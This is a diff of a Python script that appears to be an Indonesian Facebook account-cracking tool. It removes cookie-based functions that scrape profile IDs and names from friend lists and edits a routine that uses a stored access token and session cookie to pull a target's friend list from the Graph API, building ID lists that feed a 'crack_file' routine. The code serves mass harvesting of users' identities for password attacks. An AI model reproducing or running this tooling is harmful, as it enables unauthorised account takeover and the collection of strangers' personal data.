@@ -560,32 +560,9 @@ def menu(my_name,my_id):
         console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
 
 
-###----------[ GET USER SENDIRI ]---------- ###
-def GetUser():
-	try:
-		cookie = open('.cok.txt','r').read()
-		url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
-		uid = re.findall('name="target" value="(.*?)"',url)[0]
-		return uid
-	except:
-		pass
-###----------[ DUMP ID PUBLIK ]---------- ###
-def Publik(url):
-	try:
-		cookie = open('.cok.txt','r').read()
-		url = parser(ses.get(url,cookies=cookie).text,"html.parser")
-		for z in url.find_all("a",href=True):
-			if "fref" in z.get("href"):
-				if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
-				else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
-				if uid+"<=>"+nama in tampung:pass
-				else:tampung.append(uid+"<=>"+nama)
-				console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-		for x in url.find_all("a",href=True):
-			if "Lihat Teman Lain" in x.text:
-				Publik("https://mbasic.facebook.com/"+x.get("href"))
-	except:pass
-		
+
+
+##------------[Crack File]------------##
 def crack_file():
 	try:vin = os.listdir('/sdcard/RUDAL-DUMP/')
 	except FileNotFoundError:
@@ -915,15 +892,14 @@ def publik():
 		prints(Panel(f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
 		a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
 		if a in ['me','Me','ME']:
-			for me in a:
-				try:
-					koH = requests.get('https://graph.facebook.com/v1.0/'+me+'?fields=friends.limit(5000)&access_token='+rud[0],cookies={'cookie': cok}).json()
-					for pi in koH['friends']['data']:
-						try:id.append(pi['id']+'|'+pi['name'])
-						except:continue
-					setting()
-				except Exception as d:
-					print(d)
+			try:
+				koH = requests.get('https://graph.facebook.com/v2.6/'+a+'?fields=friends&access_token='+rud[0],cookies={'cookie': cok}).json()
+				for pi in koH['friends']['data']:
+					try:id.append(pi['id']+'|'+pi['name'])
+					except:continue
+				setting()
+			except Exception as d:
+				print(d)
 		else:
 			try:
 				params = {
